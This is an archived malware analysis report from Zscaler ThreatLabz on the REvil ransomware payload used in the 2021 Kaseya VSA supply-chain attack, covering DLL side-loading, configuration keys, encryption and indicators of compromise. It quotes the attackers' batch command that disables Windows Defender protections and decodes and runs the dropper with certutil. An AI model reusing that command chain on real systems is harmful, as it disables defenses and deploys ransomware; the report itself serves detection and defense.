{
    "id": "8049f5e3-762a-4e52-a3ce-c02bed46fb71",
    "created_at": "2023-01-12T15:09:01.252062Z",
    "updated_at": "2025-03-27T02:06:09.679721Z",
    "deleted_at": null,
    "sha1_hash": "e4ce41051187eaf58294f573a4003c1b9ee1b6c0",
    "title": "2021-07-06 - Kaseya Supply Chain Ransomware Attack - Technical Analysis of the REvil Payload",
    "authors": "",
    "file_creation_date": "2022-05-29T10:49:34Z",
    "file_modification_date": "2022-05-29T10:49:34Z",
    "file_size": 1562646,
    "plain_text": "# Kaseya Supply Chain Ransomware Attack - Technical Analysis of the REvil Payload\n\n**[zscaler.com/blogs/security-research/kaseya-supply-chain-ransomware-attack-technical-analysis-revil-payload](https://www.zscaler.com/blogs/security-research/kaseya-supply-chain-ransomware-attack-technical-analysis-revil-payload)**\n\n[On July 2, 2021, Kaseya, an IT Management software firm, disclosed a security incident impacting their](https://helpdesk.kaseya.com/hc/en-gb/articles/4403440684689)\non-premises version of Kaseya's Virtual System Administrator (VSA) software. Kaseya VSA is a cloudbased Managed Service Provider (MSP) platform that allows service providers to perform patch\nmanagement, backups, and client monitoring for their customers. Per Kaseya, the majority of their\ncustomers that rely on Software-as-a-Service (SaaS) based offerings were not impacted by this issue;\nonly a small percentage (less than 40 worldwide) running on-premise instances of Kaseya VSA server\nwere affected, though it is believed that 1,000+ organizations were impacted downstream. Below is the\n[ThreatLabz technical deep-dive on the attack. For more background, read our full coverage blog here.](https://www.zscaler.com/blogs/security-research/coverage-advisory-kaseya-vsa-supply-chain-ransomware-attack)\n\n## Infection Overview\n\nThe threat actor behind this attack identified and exploited a zero day vulnerability in the Kaseya VSA\nserver. The compromised Kaseya VSA server was used to send a malicious script to all clients that\nwere managed by that VSA server. The script was used to deliver REvil ransomware that encrypted\nfiles on the affected systems.\n\nThe malicious script contained the following Windows batch commands as shown below:\n```\nC:\\windows\\system32\\cmd.exe /c ping 127.0.0.1 -n 7615 > nul &\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection\n$true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent\nNeverSend & copy /Y C:\\Windows\\System32\\certutil.exe C:\\Windows\\cert.exe & echo %RANDOM% >>\nC:\\Windows\\cert.exe & C:\\Windows\\cert.exe -decode c:\\kworking1\\agent.crt c:\\kworking1\\agent.exe\n& del /q /f c:\\kworking1\\agent.crt C:\\Windows\\cert.exe & c:\\kworking1\\agent.exe\n\n```\nThe PowerShell script present in the commands above disables some features of Windows Defender\nsuch as real-time protection, network protection, scanning of downloaded files, sharing of threat\ninformation with Microsoft Active Protection Service (MAPS), and automatic sample submission.\n\n\n-----\n\ncertutil.exe is used to decode the Base64 encoded payload located in agent.crt and writes the result to\nan executable file named agent.exe in the working directory of Kaseya. The Windows batch script then\nexecutes the agent.exe file, which will create and launch the REvil ransomware payload.\n\n## REvil/Sodinokibi Ransomware\n\nThe executable agent.exe is digitally signed with a valid digital signature with the following signer\ninformation:\n```\nName: PB03 TRANSPORT LTD.\nEmail: [email protected]\nIssuer: CN = Sectigo RSA Code Signing CA, O = Sectigo Limited, L = Salford, S = Greater\nManchester, C = GB\nThumbprint: 11FF68DA43F0931E22002F1461136C662E623366\nSerial Number: 11 9A CE AD 66 8B AD 57 A4 8B 4F 42 F2 94 F8 F0\n\n```\nUpon execution, the file agent.exe drops two additional files which are present in its resource section\nwith the names SOFTIS and MODLIS. These two files are written to the C:\\Windows directory. If the\nmalware is unable to write to this location (e.g., insufficient permissions), these files will alternatively be\ndropped in the Windows %temp% directory. These two files are the following:\n\nMsMpEng.exe - This is a legitimate application of Windows Defender and vulnerable to sideloading attacks.\nmpsvc.dll - This is an REvil ransomware DLL.\n\nThe executable file agent.exe then executes MsMpEng.exe, which is vulnerable to a DLL side-loading\nattack to load the REvil ransomware DLL file mpsvc.dll that is located in the same directory. As a result\nof the vulnerability, the Windows Defender executable will load the REvil DLL into its own context as\nshown in Figure 1.\n\nFigure 1. Main function of the malicious executable used in the Kaseya attack that drops a vulnerable\ncopy of Windows Defender to load REvil ransomware.\n\nThis variant of REvil (aka Sodinokibi) ransomware uses several techniques to evade security products.\nThis includes the malware using a custom packer, with the REvil payload distributed as a portable\nexecutable (PE) with a modified header as shown in Figure 2 (where the original PE header is shown\n\n\n-----\n\non the left and the modified header is shown on the right). This is likely designed to evade security\nsoftware products that are not able to properly handle PE files that have been modified.\n\nFigure 2. Modified REvil PE header (the original header is shown on the left, while the Kaseya REvil\npayload is shown on the right).\n\nThe malware binary has an embedded encrypted configuration which is decrypted using RC4\nencryption at runtime as shown in Figure 3.\n\n\n-----\n\nFigure 3. RC4 decryption of REvil configuration.\n\nThe REvil ransomware configuration contains specific settings for the malware. The configuration is\nstored in JSON format with the configuration parameters shown in Table 1.\n\n\nConfiguration\nKey\n\n\nDescription\n\n\narn Establish persistence via an autorun registry value\n\ndbg Enable debug mode\n\ndmn Semicolon separated list of potential C&C domains\n\net Encryption type (partial or full)\n\nexp Attempt to elevate privileges by exploiting a local privilege escalation (LPE)\nvulnerability\n\nimg Base64 encoded ransom wallpaper\n\nnbody Base64 encoded ransom note\n\nnet Send beacons to the REvil command and control server\n\nnname File name of ransom note dropped in folders where files were encrypted\n\npid Unique ID to identify this attack\n\npk Base64 encoded value of attacker’s public key used to encrypt files\n\nprc List of processes to kill\n\nrdmcnt Readme count (always set to 0)\n\nsub Possible campaign/affiliate ID or just sub version number\n\nsvc List of services to stop\n\nwfld Directories to wipe\n\n\n-----\n\nwht List of allowed extensions, folder names and file names\n\nwipe Wipe specified directories\n\nTable 1. REvil configuration keys and their purpose.\n\n[The full decrypted configuration for this REvil attack can be found here.](https://paste.ee/p/fpRyk)\n\nThis variant of REvil has the key net assigned with the value false, which instructs the ransomware not\nto beacon information back to the C&C domains after encryption. This is likely to evade network-based\nsignatures that could potentially alert victims to an ongoing attack. The REvil configuration in the\nKaseya attack disables persistence through the arn configuration parameter, which may also be\ndesigned to evade early-stage detection.\n\nBefore the encryption process, the registry key\nHKEY_LOCAL_MACHINE\\SOFTWARE\\BlackLivesMatter is created to store the victim’s and attacker’s\nencryption key information and the file extension to be appended, as shown in below Figure 4.\n\nFigure 4. Registry key names and values created by REvil ransomware.\n\nThe registry key values are described below in Table 2.\n\nRegistry Value Name Description\n\n96Ia6 Victim’s secret key encrypted with the attacker’s public key (“pk”)\n\nEd7 Attacker’s public key\n\nJmfOBvhb Encrypted victim’s key (same as key present in ransom note)\n\nQIeQ Victim’s public key\n\nUcr1RB Victim’s secret key encrypted with master public key\n\n\n-----\n\nwJWsTYE Extension to be appended after encryption\n\nTable 2. REvil registry key values.\n\nREvil changes the Windows firewall settings to allow the local system to be discovered on the local\nnetwork by other computers with the command:\n```\nnetsh advfirewall firewall set rule group=”Network Discovery” new enable=Yes\n\n## File Encryption Process\n\n```\nREvil ransomware will encrypt all files that are not contained within the allowlisted filenames and\nextension fields, which are stored in the configuration. REvil reads each file, encrypts the contents, and\nwrites the result back to the original file to prevent file recovery. After the encryption, a footer is written\nto the end of the file and the encrypted file is renamed with an appended file extension. REvil\nransomware uses a combination of Curve25519 (asymmetric) and Salsa20 (symmetric) encryption\nalgorithms to encrypt files on the system. The Salsa20 encryption key is derived from the victim's public\nkey and secret key of the key pair generated for each file. To decrypt a file, the victim's secret key and\nfile public key must be known.\n\nThe ransomware writes a footer that has a size of 232 (0xE8) bytes at the end of every encrypted file.\nThe footer metadata contains the information shown below in Table 3.\n\nParameter Data size Description\n\nattacker_public_key 0x58 Victim’s secret key encrypted with the attacker’s public key\n\nmaster_public_key 0x58 Victim’s secret key encrypted with a master public key\n\nfile_public_key 0x20 Public key generated for each file\n\nsalsa20_nonce 0x8 Salsa-20 nonce\n\ncrc32_file_public_key 0x4 CRC32 checksum of file_public_key\n\net_config 0x4 Encryption type (0 in this case)\n\nsk_size 0x4 Bytes to skip during encryption\n\nnull_encrypted 0x4 NULL value encrypted with Salsa20 encryption\n\nTable 3. REvil footer added to encrypted files.\n\nAn example REvil footer is shown below in Figure 5, with the corresponding fields highlighted.\n\n\n-----\n\nFigure 5. Footer metadata appended to a file encrypted by REvil.\n\nAfter the encryption, REvil drops a ransom note with the format {random alphanumeric characters}readme.txt based on the rdmcnt configuration (in this case, rdmcnt is set to zero, so REvil will drop a\nransom note in every directory). The ransomware then drops the content to a file from the img\nconfiguration value in the Windows %temp% directory and sets the wallpaper to use this file on the\ninfected system. Figure 6 displays a screenshot with the REvil ransom note and wallpaper after the file\nencryption is completed.\n\n\n-----\n\nFigure 6: REvil ransom note and wallpaper after file encryption.\n\nThe author of REvil ransomware has posted attack details on their leak website as shown in Figure 7.\nThe group is currently demanding $70 million worth of Bitcoin for a master decryption tool.\n\n\n-----\n\nFigure 7. REvil’s Kaseya attack post on their dark web leak site.\n\n## Indicators of Compromise (IOCs)\n\nThe following IOCs can be used to detect REvil infections used in the Kaseya attack.\n\nHash Type Description\n\n95f0a946cd6881dd5953e6db4dfb0cb9 MD5 agent.crt\n(encoded\nREvil\ndropper)\n\n561cffbaba71a6e8cc1cdceda990ead4 MD5 agent.exe\n(REvil\ndropper)\n\na47cf00aedf769d60d58bfe00c0b5421 MD5 mpsvc.dll\n(REvil\nransomware)\n\n7ea501911850a077cf0f9fe6a7518859 MD5 mpsvc.dll\n(REvil\nransomware)\n\n\n-----\n\n2093c195b6c1fd6ab9e1110c13096c5fe130b75a84a27748007ae52d9e951643 SHA256 agent.crt\n(encoded\nREvil\ndropper)\n\nd55f983c994caa160ec63a59f6b4250fe67fb3e8c43a388aec60a4a6978e9f1e SHA256 agent.exe\n(REvil\ndropper)\n\n8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd SHA256 mpsvc.dll\n(REvil\nransomware)\n\ne2a24ab94f865caeacdf2c3ad015f31f23008ac6db8312c2cbfb32e4a5466ea2 SHA256 mpsvc.dll\n(REvil\nransomware)\n\n[The full list of 1200+ hardcoded beacon domains related to this REvil variant can be found here.](https://pastebin.com/nP1CFeT8)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-06 - Kaseya Supply Chain Ransomware Attack - Technical Analysis of the REvil Payload.pdf"
    ],
    "report_names": [
        "2021-07-06 - Kaseya Supply Chain Ransomware Attack - Technical Analysis of the REvil Payload.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536141,
    "ts_updated_at": 1743041169,
    "ts_creation_date": 1653821374,
    "ts_modification_date": 1653821374,
    "files": {
        "pdf": "https://archive.orkl.eu/e4ce41051187eaf58294f573a4003c1b9ee1b6c0.pdf",
        "text": "https://archive.orkl.eu/e4ce41051187eaf58294f573a4003c1b9ee1b6c0.txt",
        "img": "https://archive.orkl.eu/e4ce41051187eaf58294f573a4003c1b9ee1b6c0.jpg"
    }
}